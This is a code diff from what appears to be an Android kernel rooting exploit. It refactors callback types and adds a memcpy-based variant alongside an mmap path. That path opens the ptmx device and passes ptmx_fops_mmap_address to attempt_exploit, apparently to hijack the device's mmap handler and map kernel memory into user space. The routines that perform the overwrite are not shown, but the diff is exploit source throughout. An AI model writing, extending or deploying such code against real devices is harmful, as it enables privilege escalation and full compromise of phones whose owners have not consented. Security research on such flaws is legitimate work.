@@ -101,7 +101,7 @@ run_callback_with_mmap(void *user_data)
   int fd;
   void *address;
   void *start_address = (void *)0x20000000;
-  mmap_callback_t callback = (mmap_callback_t)user_data;
+  memory_callback_t callback = (memory_callback_t)user_data;
   bool ret;
 
   fd = open(PTMX_DEVICE, O_RDWR);
@@ -123,15 +123,15 @@ run_callback_with_mmap(void *user_data)
   return ret;
 }
 
-typedef struct _callback_mmap_exploit_info_t {
-  mmap_callback_t func;
+typedef struct _callback_memory_exploit_info_t {
+  memory_callback_t func;
   bool result;
-} callback_mmap_exploit_info_t;
+} callback_memory_exploit_info_t;
 
 static bool
-run_callback_mmap_exploit(void *address, size_t length, void *param)
+run_callback_memory_exploit(void *address, size_t length, void *param)
 {
-  callback_mmap_exploit_info_t *info = param;
+  callback_memory_exploit_info_t *info = param;
 
   info->result = info->func(address, length);
 
@@ -139,13 +139,13 @@ run_callback_mmap_exploit(void *address, size_t length, void *param)
 }
 
 static bool
-run_exploit_mmap(mmap_callback_t callback, bool *result)
+run_exploit_mmap(memory_callback_t callback, bool *result)
 {
-  callback_mmap_exploit_info_t info;
+  callback_memory_exploit_info_t info;
 
   info.func = callback;
 
-  if (attempt_mmap_exploit(&run_callback_mmap_exploit, &info)) {
+  if (attempt_mmap_exploit(&run_callback_memory_exploit, &info)) {
     *result = info.result;
     return true;
   }
@@ -154,7 +154,7 @@ run_exploit_mmap(mmap_callback_t callback, bool *result)
 }
 
 bool
-run_with_mmap(mmap_callback_t callback)
+run_with_mmap(memory_callback_t callback)
 {
   unsigned long int kernel_physical_offset;
   bool result;
@@ -188,4 +188,31 @@ run_with_mmap(mmap_callback_t callback)
   return attempt_exploit(ptmx_fops_mmap_address,
                          (unsigned long int)&ptmx_mmap, 0,
 			 run_callback_with_mmap, callback);
+}
+
+static bool
+run_exploit_memcpy(memory_callback_t callback, bool *result)
+{
+  callback_memory_exploit_info_t info;
+
+  info.func = callback;
+
+  if (attempt_memcpy_exploit(&run_callback_memory_exploit, &info)) {
+    *result = info.result;
+    return true;
+  }
+
+  return false;
+}
+
+bool
+run_with_memcpy(memory_callback_t callback)
+{
+  bool result;
+
+  if (run_exploit_memcpy(callback, &result)) {
+    return result;
+  }
+
+  return false;
 }
